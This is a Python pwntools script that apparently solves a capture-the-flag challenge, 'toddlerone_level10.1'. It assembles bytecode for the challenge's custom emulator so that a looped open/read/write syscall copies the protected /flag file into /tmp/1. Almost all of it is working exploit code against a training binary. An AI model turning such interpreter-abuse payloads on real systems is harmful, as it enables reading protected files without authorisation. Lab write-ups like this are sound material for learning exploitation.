from pwn import *
from pyrsistent import b
context.arch='amd64'
reg = {'a': b'\x08' , 'b':b'\x02' , 'c':b'\x04', 'd':b'\x20', 's':b'\x10', 'i':b'\x01', 'f':b'\x40'}
ins = {'imm' : b'\x40', 'add':b'\x04', 'stm' : b'\x80', 'cmp':b'\x10', 'jmp':b'\x01', 'sys': b'\x02'}
systable = {'crash':b'\x10','read':b'\x10', 'write' :b'\x04','open' : b'\x20'}

def imm(regNo, imm):
    a = {'1' : int.to_bytes(imm,1,'little') , '2' : reg[regNo] , '3' : ins['imm']}
    return  a['3'] + a['1'] + a['2']

def stm(offset,w_imm):
    a = {'1' : reg['a'] , '2' : reg['b'] , '3' : ins['stm']}
    payload = b''
    payload += imm('a',offset)
    payload += imm('b',w_imm)
    payload += a['3'] + a['2'] + a['1']
   
    return payload 

def open1(file_name,flags,mode,ret_regNo):
    a = {'1' : systable['open'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',file_name)
    payload += imm('b',flags)
    payload += imm('c',mode)
    payload = payload + a['3'] + a['2'] + a['1']

    return payload

def read_0(fd,offset,count,ret_regNo):
    a = {'1' : systable['read'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload +  a['3'] + a['2'] + a['1']

    return payload

def write_300(fd,offset,count,ret_regNo):
    a = {'1' : systable['write'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload +  a['3'] + a['2'] + a['1']

    return payload

def add(reg1,reg2):
    a = {'1' : reg[reg1] , '2' : reg[reg2] , '3' : ins['add']}
    return a['3'] + a['2'] + a['1']

def cmp(reg1,reg2):
    a = {'1' : reg[reg1] , '2' : reg[reg2] , '3' : ins['cmp']}
    return a['3'] + a['1'] + a['2']

def jmp(reg1,f):
    a = {'1' : int.to_bytes(f,1,'little') , '2' : reg[reg1] , '3' : ins['jmp']}
    return a['3'] + a['2'] + a['1']

def exit0():
    return b'\x02\x00\x10'

r = process('/challenge/toddlerone_level10.1')
#r = process(['sudo','strace','/challenge/toddlerone_level10.1'])
## cmp a: arg1 b: arg2
# a < b : f=0x01^0x04
# a > b : f=0x02^0x04
# a == b : 0x08
# a == b == 0 : 0x10^0x08

# jmp : flag reg sys
# jmp flag==0
# jmp flag!=0 f&flag != 0

payload = b''

orw = int.to_bytes(0x4 ^ 0x02 ^ 0x20,1,'little')  ##  systable['read'] ^ systable['open'] ^ systable['write']
# open flag
payload += stm(0,ord('/')) # 3
payload += stm(1,ord('f')) # 6
payload += stm(2,ord('l')) # 9
payload += stm(3,ord('a')) # 12
payload += stm(4,ord('g')) # 15
payload += imm('a',0) # filename 16
payload += imm('b',0) #  flags 17
payload += imm('c',0) #  modes 18
payload += imm('f',0) # 19
payload += imm('d',0) # 20 use d as syscall count
payload = payload + ins['sys'] + reg['s'] + orw ## syscall of open read write 21
payload += imm('s',1)
payload += add('d','s')  ## add when sys call
# open 123(write only)

payload += stm(0x50,ord('/'))
payload += stm(0x51,ord('t'))
payload += stm(0x52,ord('m'))
payload += stm(0x53,ord('p'))
payload += stm(0x54,ord('/'))
payload += stm(0x55,ord('1'))
payload += imm('a',0x50) ##filename offset
payload += imm('b',1) # flags
payload += imm('c',0) # modes
payload += imm('f',1)
payload += cmp('d','f') 
payload += imm('s',20)

payload += jmp('s',0x08) ## if syscount == 1 jmp

# read
payload += imm('b',0) # buffer_offset
payload += imm('c',0x50) # count
payload += imm('a',3) # fd
payload += imm('f',2)
payload += cmp('d','f')
payload += imm('s',20)
payload += jmp('s',0x08) ## jmp if d == 2
# write 
payload += imm('b',0) # buffer_offset 
payload += imm('c',0x50) # count 
payload += imm('a',4) # fd  
payload += imm('f',3)
payload += cmp('d','f')
payload += imm('s',20)
payload += jmp('s',0x08) # jmp orw
payload += b'\x40'*10 ### crash


r.send(payload)


r.interactive()



